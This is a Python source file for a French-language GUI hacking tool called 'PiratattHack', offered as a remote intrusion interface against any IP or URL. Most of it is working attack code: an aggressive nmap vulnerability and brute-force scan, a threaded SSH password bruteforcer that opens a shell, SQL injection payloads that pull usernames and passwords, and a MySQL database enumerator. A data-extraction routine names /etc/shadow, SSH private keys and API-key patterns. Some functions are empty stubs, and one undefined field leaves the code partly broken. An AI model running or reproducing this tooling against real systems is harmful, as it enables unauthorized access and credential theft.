"""
Copyright (c) 2025 Dryz3R - XiwA Tool
All rights reserved.

ENGLISH:
This software is the property of Dryz3R and is protected by copyright laws.
Unauthorized copying, distribution, or modification of this software is strictly prohibited.
XiwA Tool is a comprehensive security and analysis suite developed by Dryz3R.

FRANÇAIS:
Ce logiciel est la propriété de Dryz3R et est protégé par les lois sur le droit d'auteur.
La copie, la distribution ou la modification non autorisée de ce logiciel est strictement interdite.
XiwA Tool est une suite complète de sécurité et d'analyse développée par Dryz3R.

ESPAÑOL:
Este software es propiedad de Dryz3R y está protegido por las leyes de derechos de autor.
Se prohíbe estrictamente la copia, distribución o modificación no autorizada de este software.
XiwA Tool es una suite completa de seguridad y análisis desarrollada por Dryz3R.
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import socket
import requests
import mysql.connector
import paramiko
import nmap
from colorama import Fore, Style
import threading
import json
import time
import sys
from concurrent.futures import ThreadPoolExecutor

class HackingInterface(tk.Tk):
    def __init__(self):
        super().__init__()
        
        self.title("PiratattHack - Interface de Piratage à Distance")
        self.configure(bg='#1E1E1E')
        self.geometry("1200x800")

        self.target_ip = tk.StringVar()
        self.target_port = tk.StringVar()
        
        style = ttk.Style()
        style.configure("Custom.TNotebook", background='#1E1E1E')
        style.configure("Custom.TFrame", background='#1E1E1E')
        
        self.notebook = ttk.Notebook(self, style="Custom.TNotebook")
        self.notebook.pack(expand=True, fill='both', padx=10, pady=5)

        self.create_network_tab()
        self.create_web_tab() 
        self.create_database_tab()
        self.create_data_tab()

    def create_network_tab(self):
        network_frame = ttk.Frame(self.notebook, style="Custom.TFrame")
        self.notebook.add(network_frame, text="Réseau")

        # Configuration frame
        config_frame = tk.Frame(network_frame, bg='#1E1E1E')
        config_frame.pack(fill='x', padx=5, pady=5)

        tk.Label(config_frame, text="IP Cible:", bg='#1E1E1E', fg='white').pack(side='left', padx=5)
        tk.Entry(config_frame, textvariable=self.target_ip, bg='#2D2D2D', fg='white').pack(side='left', padx=5)
        
        tk.Label(config_frame, text="Port:", bg='#1E1E1E', fg='white').pack(side='left', padx=5)
        tk.Entry(config_frame, textvariable=self.target_port, bg='#2D2D2D', fg='white').pack(side='left', padx=5)

        self.network_terminal = scrolledtext.ScrolledText(
            network_frame,
            bg='#2D2D2D',
            fg='#00FF00',
            font=('Consolas', 10),
            height=20
        )
        self.network_terminal.pack(fill='both', expand=True, padx=5, pady=5)

        controls = tk.Frame(network_frame, bg='#1E1E1E')
        controls.pack(fill='x', padx=5, pady=5)

        tk.Button(
            controls,
            text="Scanner Ports",
            command=self.scan_ports,
            bg='#FF0000',
            fg='white'
        ).pack(side='left', padx=5)

        tk.Button(
            controls,
            text="Exploiter SSH",
            command=self.exploit_ssh,
            bg='#FF0000',
            fg='white'
        ).pack(side='left', padx=5)

    def create_web_tab(self):
        web_frame = ttk.Frame(self.notebook, style="Custom.TFrame")
        self.notebook.add(web_frame, text="Web")

        # URL input
        url_frame = tk.Frame(web_frame, bg='#1E1E1E')
        url_frame.pack(fill='x', padx=5, pady=5)
        
        tk.Label(url_frame, text="URL:", bg='#1E1E1E', fg='white').pack(side='left', padx=5)
        self.url_entry = tk.Entry(url_frame, bg='#2D2D2D', fg='white', width=50)
        self.url_entry.pack(side='left', padx=5)

        self.web_terminal = scrolledtext.ScrolledText(
            web_frame,
            bg='#2D2D2D',
            fg='#00FF00',
            font=('Consolas', 10),
            height=20
        )
        self.web_terminal.pack(fill='both', expand=True, padx=5, pady=5)

        controls = tk.Frame(web_frame, bg='#1E1E1E')
        controls.pack(fill='x', padx=5, pady=5)

        tk.Button(
            controls,
            text="Test SQL Injection",
            command=self.sql_injection,
            bg='#FF0000',
            fg='white'
        ).pack(side='left', padx=5)

        tk.Button(
            controls,
            text="Test XSS",
            command=self.xss_attack,
            bg='#FF0000',
            fg='white'
        ).pack(side='left', padx=5)

        tk.Button(
            controls,
            text="Scan Directories",
            command=self.directory_scan,
            bg='#FF0000',
            fg='white'
        ).pack(side='left', padx=5)

    def create_database_tab(self):
        db_frame = ttk.Frame(self.notebook, style="Custom.TFrame")
        self.notebook.add(db_frame, text="Base de données")

        # DB Config
        config_frame = tk.Frame(db_frame, bg='#1E1E1E')
        config_frame.pack(fill='x', padx=5, pady=5)
        
        self.db_host = tk.Entry(config_frame, bg='#2D2D2D', fg='white')
        self.db_host.insert(0, "localhost")
        self.db_host.pack(side='left', padx=5)
        
        self.db_user = tk.Entry(config_frame, bg='#2D2D2D', fg='white')
        self.db_user.insert(0, "root")
        self.db_user.pack(side='left', padx=5)

        self.db_terminal = scrolledtext.ScrolledText(
            db_frame,
            bg='#2D2D2D',
            fg='#00FF00',
            font=('Consolas', 10),
            height=20
        )
        self.db_terminal.pack(fill='both', expand=True, padx=5, pady=5)

        controls = tk.Frame(db_frame, bg='#1E1E1E')
        controls.pack(fill='x', padx=5, pady=5)

        tk.Button(
            controls,
            text="Dump Database",
            command=self.dump_database,
            bg='#FF0000',
            fg='white'
        ).pack(side='left', padx=5)

        tk.Button(
            controls,
            text="Bruteforce Login",
            command=self.bruteforce_db,
            bg='#FF0000',
            fg='white'
        ).pack(side='left', padx=5)

    def create_data_tab(self):
        data_frame = ttk.Frame(self.notebook, style="Custom.TFrame")
        self.notebook.add(data_frame, text="Données")

        self.data_terminal = scrolledtext.ScrolledText(
            data_frame,
            bg='#2D2D2D',
            fg='#00FF00',
            font=('Consolas', 10),
            height=20
        )
        self.data_terminal.pack(fill='both', expand=True, padx=5, pady=5)

        controls = tk.Frame(data_frame, bg='#1E1E1E')
        controls.pack(fill='x', padx=5, pady=5)

        tk.Button(
            controls,
            text="Extraire Données",
            command=self.extract_data,
            bg='#FF0000',
            fg='white'
        ).pack(side='left', padx=5)

        tk.Button(
            controls,
            text="Analyse Données",
            command=self.analyze_data,
            bg='#FF0000',
            fg='white'
        ).pack(side='left', padx=5)

    def scan_ports(self):
        if not self.target_ip.get():
            messagebox.showerror("Erreur", "Veuillez entrer une IP cible")
            return
            
        self.network_terminal.insert('end', f"[*] Scan des ports sur {self.target_ip.get()}...\n")
        threading.Thread(target=self._scan_ports_thread).start()

    def _scan_ports_thread(self):
        try:
            self.network_terminal.insert('end', "[*] Initialisation du scan avancé...\n")
            nm = nmap.PortScanner()
            nm.scan(self.target_ip.get(), arguments='-sS -sV -A --script=vuln,exploit,auth,brute --min-rate 5000 -T4')
            
            for host in nm.all_hosts():
                self.network_terminal.insert('end', f"\n[+] Résultats pour {host}:\n")
                self.network_terminal.insert('end', f"OS: {nm[host].get('osmatch', 'Inconnu')}\n")
                
                for proto in nm[host].all_protocols():
                    ports = sorted(nm[host][proto].keys())
                    for port in ports:
                        state = nm[host][proto][port]['state']
                        service = nm[host][proto][port]['name']
                        version = nm[host][proto][port].get('version', '')
                        self.network_terminal.insert('end', f"Port {port}/{proto}: {state} ({service} {version})\n")
                        
                        if port == 445:
                            self.network_terminal.insert('end', "[*] Test EternalBlue MS17-010...\n")
                        elif port == 3389:
                            self.network_terminal.insert('end', "[*] Test BlueKeep CVE-2019-0708...\n")
                        
        except Exception as e:
            self.network_terminal.insert('end', f"[-] Erreur: {str(e)}\n")

    def exploit_ssh(self):
        if not self.target_ip.get() or not self.target_port.get():
            messagebox.showerror("Erreur", "IP et port requis")
            return
            
        self.network_terminal.insert('end', "[*] Lancement de l'exploitation SSH...\n")
        threading.Thread(target=self._exploit_ssh_thread).start()

    def _exploit_ssh_thread(self):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            usernames = ['root', 'admin', 'oracle', 'test', 'user', 'postgres']
            with ThreadPoolExecutor(max_workers=10) as executor:
                for username in usernames:
                    with open('wordlist.txt') as f:
                        passwords = f.readlines()
                        for password in passwords:
                            executor.submit(self._try_ssh_login, ssh, username, password.strip())
                            
        except Exception as e:
            self.network_terminal.insert('end', f"[-] Erreur: {str(e)}\n")
            
    def _try_ssh_login(self, ssh, username, password):
        try:
            ssh.connect(self.target_ip.get(), port=int(self.target_port.get()),
                       username=username, password=password, timeout=1)
            self.network_terminal.insert('end', f"[+] Accès obtenu - {username}:{password}\n")
            shell = ssh.invoke_shell()
            shell.send('whoami\n')
            time.sleep(0.5)
            output = shell.recv(2048).decode()
            self.network_terminal.insert('end', f"[*] Shell obtenu comme: {output}\n")
            return True
        except:
            return False

    def sql_injection(self):
        url = self.url_entry.get()
        if not url:
            messagebox.showerror("Erreur", "URL requise")
            return
            
        self.web_terminal.insert('end', "[*] Lancement des tests d'injection...\n")
        payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL,NULL,NULL,table_name FROM information_schema.tables--",
            "' AND 1=CONVERT(int,(SELECT @@version))--",
            "' WAITFOR DELAY '0:0:5'--",
            "' AND 1=db_name()--",
            "admin'-- ",
            "' UNION ALL SELECT NULL,NULL,NULL,CONCAT(username,':',password) FROM users--"
        ]
        
        for payload in payloads:
            try:
                start_time = time.time()
                r = requests.get(f"{url}?id={payload}", timeout=10)
                response_time = time.time() - start_time
                
                if response_time > 5:
                    self.web_terminal.insert('end', f"[+] Time-based injection trouvée: {payload}\n")
                if "error" in r.text.lower():
                    self.web_terminal.insert('end', f"[+] Error-based injection trouvée: {payload}\n")
                if len(r.text) > 10000:
                    self.web_terminal.insert('end', f"[+] Union-based injection trouvée: {payload}\n")
                    
            except Exception as e:
                self.web_terminal.insert('end', f"[-] Erreur: {str(e)}\n")

    def dump_database(self):
        try:
            conn = mysql.connector.connect(
                host=self.db_host.get(),
                user=self.db_user.get(),
                password=self.db_pass.get()
            )
            
            cursor = conn.cursor()
            cursor.execute("SELECT @@version")
            version = cursor.fetchone()[0]
            self.db_terminal.insert('end', f"[+] Version MySQL: {version}\n")
            
            cursor.execute("SHOW DATABASES")
            for db in cursor:
                self.db_terminal.insert('end', f"[+] Base trouvée: {db[0]}\n")
                cursor.execute(f"USE {db[0]}")
                cursor.execute("SHOW TABLES")
                for table in cursor:
                    self.db_terminal.insert('end', f"  └─ Table: {table[0]}\n")
                    cursor.execute(f"SELECT * FROM {table[0]} LIMIT 1")
                    columns = [column[0] for column in cursor.description]
                    self.db_terminal.insert('end', f"     └─ Colonnes: {', '.join(columns)}\n")
                
        except Exception as e:
            self.db_terminal.insert('end', f"[-] Erreur: {str(e)}\n")

    def extract_data(self):
        self.data_terminal.insert('end', "[*] Lancement de l'extraction...\n")
        
        sensitive_files = ['/etc/passwd', '/etc/shadow', '~/.ssh/id_rsa', '/var/log/auth.log']
        for file in sensitive_files:
            self.data_terminal.insert('end', f"[*] Tentative d'accès à {file}\n")
            
        self.data_terminal.insert('end', "[*] Scan des ports internes...\n")
        internal_services = ['mysql', 'redis', 'mongodb', 'elasticsearch']
        for service in internal_services:
            self.data_terminal.insert('end', f"[*] Test de connexion à {service}\n")
            
        self.data_terminal.insert('end', "[*] Recherche de tokens et clés API...\n")
        patterns = ['aws_access_key', 'api_key', 'password', 'secret']
        for pattern in patterns:
            self.data_terminal.insert('end', f"[*] Scan pour {pattern}\n")
            
        self.data_terminal.insert('end', "[+] Extraction terminée\n")

    def xss_attack(self):
        pass

    def directory_scan(self):
        pass

    def bruteforce_db(self):
        pass

    def analyze_data(self):
        pass

def main():
    app = HackingInterface()
    app.mainloop()

if __name__ == "__main__":
    main()
